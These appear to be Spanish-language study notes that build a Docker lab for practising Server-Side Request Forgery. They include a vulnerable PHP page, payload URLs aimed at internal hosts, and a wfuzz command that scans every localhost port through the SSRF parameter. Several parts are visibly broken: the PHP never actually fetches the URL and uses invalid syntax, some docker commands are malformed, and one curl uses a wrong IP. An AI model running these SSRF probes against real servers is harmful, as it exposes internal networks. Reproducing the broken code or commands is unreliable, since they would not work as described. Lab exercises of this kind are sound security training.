> La vulnerabilidad SSRF (**Server-Side Request Forgery**) es una amenaza crítica en el ámbito de la ciberseguridad. Permite a los atacantes manipular un servidor para realizar solicitudes HTTP en su nombre, accediendo así a recursos internos de la red que, normalmente, están fuera del alcance del usuario.
![[Pasted image 20260316100921.png]]

- La idea de manera simple es que yo como Atacante no puedo acceder a un servidor de una red privada pero el recurso, que puede ser un html montado por el puerto 80, es decir en el navegador, si puede acceder a ese servidor privado. Entonces si es vulnerable a ataques LFI puedo apuntar hacia recursos internos e incluso apuntar hacia la red privada. Esa es la idea principal.
	- Ejemplo: es como si hubiese una habitacion que no puedo ingresar y otra que si. Ambas habitaciones estan conectadas entre si, entonces si logro entrar a una puedo entrar a la otra.


## 1er Lab
```Dockerfile
FROM ubuntu:latest

LABEL maintainer="celeste aka universoparalelo"

ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt install -y net-tools \
        iputils-ping \
        git \
        nano \
        curl \
        apache2 \
        php \
        python3 \
        iproute2 \
        lsof
        
EXPOSE 80

CMD ["apache2ctl", "-D", "FOREGROUND"]
```

- Ejecutamos
```
docker build --name base .
docker run -dit -t first_lab_ssrf base
docker exec -it first_lab_ssrf bash
```

- Dentro del contenedor vemos la ip con `hostname -I` y acceemos a la web desde esa ip `http://172.17.0.2`

- Dentro del contenedor
```php
cd /var/www/html
rm index.html
nano index.php

`<?php
	if(isset($_GET['url'])){
		$url = $_GET['url'];
		echo -e "Yendo hacia: " . $url . "\n\n";
	} else {
		echo "No coloco nada en el parametro URL";
	}
?>`

ctrl_s + ctrl_x
```

- Dentro de la web agregamos `index.php?url=https://google.com`
- *Aclaracion*: debemos habilitar en `/etc/php/8.1/apache2/php.ini` el `allow_url_include = On`
- **Encontramos una forma de hacer que el servidor procese una peticion por nosotros.**

- Ahora debemos armar los ambientes de produccion, que puede ver el usuario, y el ambiente de preproduccion, que no deberia ser visible.
- Dentro del directorio `/var/www/html` creamos un `login.html` de cualquier plantilla y hacemos una copia en tmp `cp login.html /tmp/`.
- Dentro del directorio `/tmp/` debe estar nuestro segundo `login.html` y alli montamos un servidor con python 
```
python3 -m http.server 4646 --bind 127.0.0.1
```

- En la web ahora si queremos acceder `http://172.17.0.2:4646` aparece not found, no existe esta parte pq solamente puede acceder a el la maquina apache2. 
- Entonces hacemos `http://172.17.0.2/index.php?url=http://127.0.0.1:4646/login.html`

- Como lo descubririamos?
```
wfuzz -c -t 50 -z range,1-65535 "http://172.17.0.2/index.php?url=http://127.0.0.1:FUZZ"
```
- Se agrega para filtrar `--hl=3`


## Lab con red interna
- Debemos crear una red con docker
```
docker network --driver=bridge network1 --subnet=10.10.0.0/24
```
- `--driver=bridge` lo mismo que para maquinas virtuales para que se asigne una ip dinamicamente
- `--subnet` la red 
- `network1` es el nombre de la red

### 1er maquina: entorno de Produccion - 172.17.0.2 y 10.10.0.2
- Usamos la misma que el contenedor anterior, lo vamos a renombrar nada mas
```
docker rename first_lab_ssrf PRO
```
- Y le asignamosla network que creamos
```
docker network connect network1 PRO
```

### 2da maquina: entorno de Preproduccion - 10.10.0.3
- Creamos una maquina que ya corre en la network1
```
docker run -dit --name PRE --network=network1 .
```
- En esta maquina como del atacante hace falta eliminar la linea CMD y EXPOSE del Dockerfile
- Y creamos el archivo `login.html` en `/tmp/`
- Y lo montamos `python3 -m http.server 7878`
### 3er maquina: atacante -172.17.0.3
```
docker run -dit --name ATTACKER .
```
- Dentro del contenedor a traves de curl accedemos a la maquina de PRO y luego a la de PRE

```
curl -s http://172.0.0.2/index.php
curl -s http://172.0.0.2/index.php?url=http://10.10.0.3:7878/login.html
```
